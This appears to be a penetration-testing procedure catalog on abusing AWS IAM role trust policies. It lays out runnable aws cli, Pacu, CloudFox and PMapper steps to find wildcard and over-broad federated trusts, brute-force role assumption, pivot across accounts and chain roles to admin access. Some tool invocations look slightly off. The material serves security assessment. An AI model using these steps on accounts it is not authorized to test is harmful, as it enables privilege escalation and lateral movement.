Repeatability: per_account
Prerequisites: Valid AWS credentials with iam:GetRole, iam:ListRoles, sts:AssumeRole, sts:GetCallerIdentity permissions
Description: Role trust policies define which principals (users, accounts, services, federated identities) are allowed to assume a given IAM role. Misconfigurations in these policies — such as wildcard principals, missing ExternalId conditions, overly permissive OIDC/SAML claims, or unrestricted GitHub Actions federation — allow attackers to assume roles they should not have access to, escalate privileges within the account, pivot across accounts, and chain role assumptions to reach administrative access. This category covers the full spectrum of trust policy abuse from enumeration through exploitation.
Tags: role-trust, confused-deputy, oidc, saml, github-actions, cross-account, federation, assume-role, privilege-escalation, sts
Potential Severity: critical

------------------------------------------
Procedure 0 — Identify Roles with Wildcard or AWS:* Principals in Trust Policies
Tools: aws cli, Prowler, ScoutSuite, jq
Intrusiveness: passive
Description: IAM roles whose trust policies contain a wildcard principal ("AWS": "*") or ("Principal": "*") allow any AWS principal — including principals from external accounts — to assume the role. This is one of the most dangerous misconfigurations possible. Even with condition keys, if conditions are missing or misconfigured, the role is fully open to assumption by any authenticated AWS entity. This procedure identifies all such roles.

Step 1: List all IAM roles in the account and extract trust policies in bulk:
```
aws iam list-roles --query 'Roles[*].[RoleName,Arn,AssumeRolePolicyDocument]' --output json > all_roles_trust.json
```

Step 2: Filter roles whose trust policy contains a wildcard principal ("*" or "AWS": "*"):
```
cat all_roles_trust.json | jq -r '.[] | select(.[2].Statement[]?.Principal == "*" or .[2].Statement[]?.Principal.AWS == "*" or (.[2].Statement[]?.Principal.AWS // [] | if type == "array" then .[] else . end | select(. == "*"))) | .[0] + " — " + .[1]'
```

Step 3: For each flagged role, retrieve and inspect the full trust policy for condition keys:
```
aws iam get-role --role-name <ROLE_NAME> --query 'Role.AssumeRolePolicyDocument' --output json | jq .
```

Step 4: Check whether the trust policy includes restrictive Condition blocks (e.g., aws:SourceAccount, aws:SourceArn, aws:PrincipalOrgID, sts:ExternalId). Absence of conditions with a wildcard principal is a critical finding.

Step 5: Run Prowler check for wildcard trust policies:
```
prowler aws -c iam_role_administratoraccess_policy -M json
```

Step 6: Validate with ScoutSuite:
```
scout suite aws --services iam --rules iam-assume-role-policy-allows-all
```

Flag: Any role with "Principal": "*" or "AWS": "*" in its trust policy without tightly scoped Condition blocks restricting which accounts/principals can assume it.

------------------------------------------
Procedure 1 — Identify Roles with Overly Broad Federated Trust (sub:* / aud:* Claims)
Tools: aws cli, jq
Intrusiveness: passive
Description: Federated trust policies (OIDC, SAML) use condition keys like token.actions.githubusercontent.com:sub, accounts.google.com:sub, or cognito-identity.amazonaws.com:aud to restrict which federated identities can assume the role. When these conditions use wildcards (e.g., "*") or are absent entirely, any federated identity from the trusted provider can assume the role. This is especially dangerous with public OIDC providers such as GitHub Actions, Google, or Auth0.

Step 1: Extract all roles with federated trust policies:
```
aws iam list-roles --output json | jq -r '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated != null) | .RoleName'
```

Step 2: For each federated role, dump the full trust policy:
```
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated != null) | {RoleName: .RoleName, Arn: .Arn, TrustPolicy: .AssumeRolePolicyDocument}' > federated_roles.json
```

Step 3: Identify trust policies where the Condition block uses wildcard values for sub or aud claims:
```
cat federated_roles.json | jq 'select(.TrustPolicy.Statement[].Condition[]?[]?[]? == "*") | .RoleName'
```

Step 4: Manually inspect each federated trust policy for these dangerous patterns:
- StringEquals / StringLike with value "*" or missing sub/aud conditions entirely
- StringLike with overly broad patterns like "repo:orgname/*" when only specific repos should be trusted
- Condition keys referencing deprecated or unused OIDC provider claims

Step 5: List all OIDC providers to understand the federation surface:
```
aws iam list-open-id-connect-providers --output json
```

Step 6: For each OIDC provider, get its configuration:
```
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <PROVIDER_ARN> --output json
```

Step 7: Check for SAML providers as well:
```
aws iam list-saml-providers --output json
```

Flag: Any federated trust policy where the sub, aud, or amr condition is set to "*", uses StringLike with overly broad globs, or is missing entirely — allowing any identity from the trusted provider to assume the role.

------------------------------------------
Procedure 2 — Attempt Role Assumption Without ExternalId (Confused Deputy)
Tools: aws cli, Pacu
Intrusiveness: low
Description: The confused deputy problem occurs when a role trust policy allows a third-party AWS account to assume the role but does not require an ExternalId condition. Without ExternalId, any service or principal within the trusted account can assume the role, not just the intended third-party application. An attacker who compromises or controls any principal in the trusted account — or who tricks the third-party service — can assume the role. This procedure tests whether roles can be assumed without providing an ExternalId.

Step 1: Identify roles that trust external AWS accounts (cross-account trust):
```
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != null) | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS != ("arn:aws:iam::" + .Arn[13:25] + ":root")) | {RoleName: .RoleName, Arn: .Arn, TrustPolicy: .AssumeRolePolicyDocument}'
```

Step 2: For each cross-account trusted role, check if the trust policy requires sts:ExternalId:
```
aws iam get-role --role-name <ROLE_NAME> --query 'Role.AssumeRolePolicyDocument' --output json | jq '.Statement[] | select(.Condition.StringEquals["sts:ExternalId"] != null)'
```

Step 3: If no ExternalId condition is present, attempt to assume the role without one (requires credentials in the trusted account or the current account if it matches):
```
aws sts assume-role --role-arn arn:aws:iam::<TARGET_ACCOUNT>:role/<ROLE_NAME> --role-session-name confused-deputy-test
```

Step 4: If assumption succeeds without ExternalId, document the returned credentials and the effective permissions of the assumed role:
```
aws sts get-caller-identity
aws iam list-attached-role-policies --role-name <ROLE_NAME>
aws iam list-role-policies --role-name <ROLE_NAME>
```

Step 5: Use Pacu to automate confused deputy testing:
```
pacu
> run iam__enum_roles
> run sts__assume_role --role-name <ROLE_NAME>
```

Flag: Any cross-account role that can be successfully assumed without providing an ExternalId, or any cross-account trust policy that does not include a sts:ExternalId condition.

------------------------------------------
Procedure 3 — Test OIDC Trust: Forge Claims via Permissive Sub Conditions
Tools: aws cli, python3, jwt (PyJWT library), curl
Intrusiveness: medium
Description: When an IAM role trusts an OIDC provider but the trust policy has permissive or missing subject (sub) conditions, an attacker who can obtain a valid token from the OIDC provider (e.g., by controlling a GitHub repo in the trusted org, or by leveraging a misconfigured identity pool) can forge or legitimately obtain a token with claims that satisfy the trust policy. This procedure tests whether OIDC-backed roles can be assumed by constructing a valid AssumeRoleWithWebIdentity call with a token containing crafted claims.

Step 1: Identify all OIDC providers and their trusted thumbprints:
```
aws iam list-open-id-connect-providers --output json | jq -r '.OpenIDConnectProviderList[].Arn'
```

Step 2: For each OIDC provider, retrieve its configuration to identify client IDs and URL:
```
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <PROVIDER_ARN> --output json | jq '{Url: .Url, ClientIDList: .ClientIDList, ThumbprintList: .ThumbprintList}'
```

Step 3: Identify roles that trust this OIDC provider:
```
aws iam list-roles --output json | jq --arg provider "<PROVIDER_URL>" '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated // "" | contains($provider)) | {RoleName: .RoleName, Conditions: .AssumeRolePolicyDocument.Statement[].Condition}'
```

Step 4: Analyze the trust policy conditions — check if sub claim is restricted or uses wildcards:
- Permissive: no sub condition, or StringLike with "*"
- Overly broad: StringLike with "system:serviceaccount:*:*" (EKS) or "repo:org/*" (GitHub)

Step 5: If you control a valid identity within the OIDC provider scope (e.g., a repo in the trusted GitHub org), obtain a legitimate OIDC token. For GitHub Actions, the token is available at:
```
curl -H "Authorization: bearer $ACTIONS_ID_TOKEN_REQUEST_TOKEN" "$ACTIONS_ID_TOKEN_REQUEST_URL&audience=sts.amazonaws.com" | jq -r '.value'
```

Step 6: Attempt to assume the role using the OIDC token:
```
aws sts assume-role-with-web-identity \
  --role-arn arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME> \
  --role-session-name oidc-forge-test \
  --web-identity-token <OIDC_TOKEN> \
  --duration-seconds 3600
```

Step 7: If assumption succeeds, enumerate effective permissions:
```
export AWS_ACCESS_KEY_ID=<returned_key>
export AWS_SECRET_ACCESS_KEY=<returned_secret>
export AWS_SESSION_TOKEN=<returned_token>
aws sts get-caller-identity
```

Step 8: Decode and inspect the OIDC token to verify which claims were accepted:
```
python3 -c "import jwt; print(jwt.decode('<OIDC_TOKEN>', options={'verify_signature': False}))"
```

Flag: Any role that can be assumed via AssumeRoleWithWebIdentity using a token whose sub/aud claims are broader than the intended scope, or any OIDC-trusted role with no sub condition in its trust policy.

------------------------------------------
Procedure 4 — Test GitHub Actions OIDC: Overly Broad repo:* Trust Conditions
Tools: aws cli, jq, GitHub Actions
Intrusiveness: medium
Description: GitHub Actions OIDC integration allows workflows to assume AWS IAM roles without long-lived credentials. The trust policy should restrict assumption to specific repositories (and optionally branches/environments) using the token.actions.githubusercontent.com:sub condition. When this condition uses overly broad patterns like "repo:orgname/*" or "repo:*", any repository in the organization — or any GitHub repository at all — can assume the role. An attacker who can create a repo in the org or trigger a workflow in any trusted repo can escalate to the role's permissions.

Step 1: List the GitHub Actions OIDC provider:
```
aws iam list-open-id-connect-providers --output json | jq -r '.OpenIDConnectProviderList[].Arn' | grep actions.githubusercontent
```

Step 2: Get the OIDC provider details:
```
aws iam get-open-id-connect-provider --open-id-connect-provider-arn <GH_OIDC_ARN> --output json
```

Step 3: Find all roles trusting the GitHub Actions OIDC provider:
```
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated // "" | contains("token.actions.githubusercontent.com")) | {RoleName: .RoleName, Arn: .Arn, TrustPolicy: .AssumeRolePolicyDocument}'
```

Step 4: Extract and analyze the sub condition for each flagged role:
```
aws iam list-roles --output json | jq '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.Federated // "" | contains("token.actions.githubusercontent.com")) | {RoleName: .RoleName, SubCondition: .AssumeRolePolicyDocument.Statement[].Condition}'
```

Step 5: Flag dangerous patterns in the sub condition:
- "repo:*" — any GitHub repo can assume the role
- "repo:orgname/*" — any repo in the org (including newly created ones)
- "repo:orgname/reponame:*" — any branch/tag/environment (less severe but still risky)
- Missing sub condition entirely — any GitHub Actions workflow can assume

Step 6: If you control a repository matching the trust pattern, create a workflow to obtain the OIDC token and assume the role:
```yaml
# .github/workflows/oidc-test.yml
name: OIDC Trust Test
on: workflow_dispatch
permissions:
  id-token: write
  contents: read
jobs:
  test:
    runs-on: ubuntu-latest
    steps:
      - name: Configure AWS Credentials
        uses: aws-actions/configure-aws-credentials@v4
        with:
          role-to-assume: arn:aws:iam::<ACCOUNT_ID>:role/<ROLE_NAME>
          aws-region: us-east-1
      - name: Verify
        run: aws sts get-caller-identity
```

Step 7: Verify the assumed role and enumerate its attached policies:
```
aws iam list-attached-role-policies --role-name <ROLE_NAME>
aws iam list-role-policies --role-name <ROLE_NAME>
```

Flag: Any role trusting token.actions.githubusercontent.com with a sub condition using "repo:*", "repo:orgname/*", or missing the sub condition entirely, allowing unauthorized GitHub repositories to assume the role.

------------------------------------------
Procedure 5 — Enumerate and Attempt sts:AssumeRole on All Discoverable Roles
Tools: aws cli, Pacu, CloudFox, enumerate-iam
Intrusiveness: low
Description: An attacker with basic IAM access should enumerate all roles in the account and systematically attempt to assume each one. Even roles not explicitly visible in the console may be assumable if the trust policy permits the attacker's principal. This procedure performs comprehensive role discovery and brute-force assumption attempts to identify all roles the current principal can escalate into.

Step 1: Get the current caller identity to understand the starting principal:
```
aws sts get-caller-identity --output json
```

Step 2: Enumerate all roles in the account:
```
aws iam list-roles --output json | jq -r '.Roles[] | .Arn + " | " + .RoleName' > all_roles.txt
```

Step 3: Attempt to assume each role with the current credentials:
```
while IFS='|' read -r arn name; do
  name=$(echo "$name" | xargs)
  arn=$(echo "$arn" | xargs)
  echo "[*] Trying: $arn"
  aws sts assume-role --role-arn "$arn" --role-session-name enum-test --duration-seconds 900 2>&1 | head -5
  echo "---"
done < all_roles.txt
```

Step 4: Use Pacu for automated role assumption enumeration:
```
pacu
> run iam__enum_roles
> run iam__enum_assume_role
```

Step 5: Use CloudFox to identify assumable roles and map permissions:
```
cloudfox aws -p <PROFILE> role-trusts
cloudfox aws -p <PROFILE> permissions
```

Step 6: For each successfully assumed role, document the credentials and effective permissions:
```
aws sts assume-role --role-arn <ASSUMABLE_ROLE_ARN> --role-session-name privesc-test --output json
```

Then with the assumed credentials:
```
aws iam list-attached-role-policies --role-name <ROLE_NAME>
aws iam list-role-policies --role-name <ROLE_NAME>
aws iam get-role-policy --role-name <ROLE_NAME> --policy-name <POLICY_NAME>
```

Step 7: Use enumerate-iam to discover effective permissions of the assumed role:
```
python3 enumerate-iam.py --access-key <KEY> --secret-key <SECRET> --session-token <TOKEN>
```

Flag: Any role that can be assumed by the current principal beyond what is expected or documented, especially roles granting elevated permissions such as AdministratorAccess, IAMFullAccess, or broad resource access.

------------------------------------------
Procedure 6 — Identify Cross-Account Role Assumptions to Pivot to Other Accounts
Tools: aws cli, CloudFox, Pacu, jq
Intrusiveness: low
Description: Cross-account role trust relationships are a primary mechanism for lateral movement between AWS accounts. An attacker who compromises credentials in one account can pivot to other accounts by assuming cross-account roles. This procedure maps all cross-account trust relationships to identify pivot paths and tests whether the current principal can reach other accounts.

Step 1: Identify the current account ID:
```
ACCOUNT_ID=$(aws sts get-caller-identity --query 'Account' --output text)
echo "Current account: $ACCOUNT_ID"
```

Step 2: Extract all roles that trust external accounts (principals outside the current account):
```
aws iam list-roles --output json | jq --arg acct "$ACCOUNT_ID" '.Roles[] | select(.AssumeRolePolicyDocument.Statement[].Principal.AWS // "" | test("arn:aws:iam::(?!" + $acct + ")")) | {RoleName: .RoleName, Arn: .Arn, TrustedPrincipals: [.AssumeRolePolicyDocument.Statement[].Principal.AWS] | flatten}'
```

Step 3: Also identify roles where the current account is trusted by roles in other accounts (requires access to those accounts or CloudTrail/org-level data):
```
aws organizations list-accounts --output json 2>/dev/null | jq -r '.Accounts[].Id'
```

Step 4: Use CloudFox to map cross-account trust relationships:
```
cloudfox aws -p <PROFILE> role-trusts
```

Step 5: For each cross-account trust, attempt assumption from the current principal:
```
aws sts assume-role \
  --role-arn arn:aws:iam::<TARGET_ACCOUNT_ID>:role/<ROLE_NAME> \
  --role-session-name xaccount-pivot-test \
  --output json
```

Step 6: If assumption succeeds, enumerate the target account:
```
export AWS_ACCESS_KEY_ID=<key>
export AWS_SECRET_ACCESS_KEY=<secret>
export AWS_SESSION_TOKEN=<token>
aws sts get-caller-identity
aws iam list-roles --query 'Roles[*].RoleName'
aws s3 ls
aws ec2 describe-instances --query 'Reservations[*].Instances[*].[InstanceId,State.Name]' --output table
```

Step 7: Use Pacu to automate cross-account enumeration:
```
pacu
> swap_keys
> run iam__enum_roles
> run iam__enum_permissions
```

Step 8: Document the full pivot path: source account → assumed role → target account → effective permissions.

Flag: Any cross-account role that can be assumed from the current account, especially when the trust allows broad principals (root, *, or organization-wide), enabling lateral movement to other AWS accounts.

------------------------------------------
Procedure 7 — Map Full Role Assumption Chain Depth (A → B → C → Admin)
Tools: aws cli, PMapper, CloudFox, jq, python3
Intrusiveness: passive
Description: IAM roles can trust other roles, which can trust other roles, forming assumption chains. An attacker with access to a low-privilege role may be able to chain multiple role assumptions to eventually reach a high-privilege role (e.g., AdministratorAccess). This procedure maps the full depth of role assumption chains to identify indirect privilege escalation paths that are not obvious from single-hop analysis.

Step 1: Build a role trust graph by extracting all trust policies:
```
aws iam list-roles --output json | jq '[.Roles[] | {RoleName: .RoleName, Arn: .Arn, TrustedPrincipals: [.AssumeRolePolicyDocument.Statement[] | select(.Effect == "Allow") | .Principal | (if .AWS then (if (.AWS | type) == "array" then .AWS[] else .AWS end) else empty end)]}]' > role_trust_graph.json
```

Step 2: Identify which roles can assume which other roles by cross-referencing trust policies with IAM policies that grant sts:AssumeRole:
```
for role in $(aws iam list-roles --query 'Roles[*].RoleName' --output text); do
  echo "=== $role ==="
  aws iam list-attached-role-policies --role-name "$role" --query 'AttachedPolicies[*].PolicyArn' --output text
  aws iam list-role-policies --role-name "$role" --output text
done > role_permissions_map.txt
```

Step 3: Use PMapper to automatically build the privilege escalation graph:
```
pmapper graph create
pmapper visualize
```

Step 4: Query PMapper for privilege escalation paths to admin:
```
pmapper query "preset privesc *"
pmapper query "can * do sts:AssumeRole arn:aws:iam::*:role/*"
```

Step 5: Use PMapper to find specific escalation chains:
```
pmapper analysis
pmapper query "who can do iam:CreateUser"
pmapper query "who can do sts:AssumeRole arn:aws:iam::<ACCOUNT_ID>:role/AdminRole"
```

Step 6: Use CloudFox to visualize role trust chains:
```
cloudfox aws -p <PROFILE> role-trusts --column2
cloudfox aws -p <PROFILE> pmapper --profile <PROFILE>
```

Step 7: Manually test an identified chain by sequentially assuming roles:
```
# Hop 1: Current principal → Role A
CREDS_A=$(aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/RoleA --role-session-name hop1 --output json)
export AWS_ACCESS_KEY_ID=$(echo $CREDS_A | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_A | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_A | jq -r '.Credentials.SessionToken')

# Hop 2: Role A → Role B
CREDS_B=$(aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/RoleB --role-session-name hop2 --output json)
export AWS_ACCESS_KEY_ID=$(echo $CREDS_B | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_B | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_B | jq -r '.Credentials.SessionToken')

# Hop 3: Role B → AdminRole
CREDS_C=$(aws sts assume-role --role-arn arn:aws:iam::<ACCT>:role/AdminRole --role-session-name hop3 --output json)
export AWS_ACCESS_KEY_ID=$(echo $CREDS_C | jq -r '.Credentials.AccessKeyId')
export AWS_SECRET_ACCESS_KEY=$(echo $CREDS_C | jq -r '.Credentials.SecretAccessKey')
export AWS_SESSION_TOKEN=$(echo $CREDS_C | jq -r '.Credentials.SessionToken')

# Verify admin access
aws sts get-caller-identity
aws iam list-users
```

Step 8: Document the complete chain with each hop, the role assumed, and the cumulative permissions gained at each step.

Flag: Any multi-hop role assumption chain where a low-privilege starting principal can ultimately reach a role with administrative or high-privilege permissions (e.g., AdministratorAccess, IAMFullAccess, PowerUserAccess, or custom policies granting broad access).

------------------------------------------
References:
- https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_terms-and-concepts.html
- https://docs.aws.amazon.com/IAM/latest/UserGuide/confused-deputy.html
- https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_providers_oidc.html
- https://docs.aws.amazon.com/IAM/latest/UserGuide/id_roles_create_for-idp_oidc.html
- https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRoleWithWebIdentity.html
- https://docs.aws.amazon.com/STS/latest/APIReference/API_AssumeRole.html
- https://docs.github.com/en/actions/security-for-github-actions/security-hardening-your-deployments/configuring-openid-connect-in-amazon-web-services
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-privilege-escalation/aws-sts-privesc
- https://cloud.hacktricks.xyz/pentesting-cloud/aws-security/aws-services/aws-iam-enum
- https://rhinosecuritylabs.com/aws/assume-worst-aws-assume-role-enumeration/
- https://github.com/nccgroup/PMapper
- https://github.com/BishopFox/cloudfox
- https://github.com/RhinoSecurityLabs/pacu
- https://github.com/andresriancho/enumerate-iam
- https://securitylabs.datadoghq.com/articles/exploring-github-to-aws-keyless-authentication-flaws/
- https://blog.christophetd.fr/hacking-github-actions-oidc-to-aws/
- https://www.wiz.io/blog/github-actions-oidc-aws
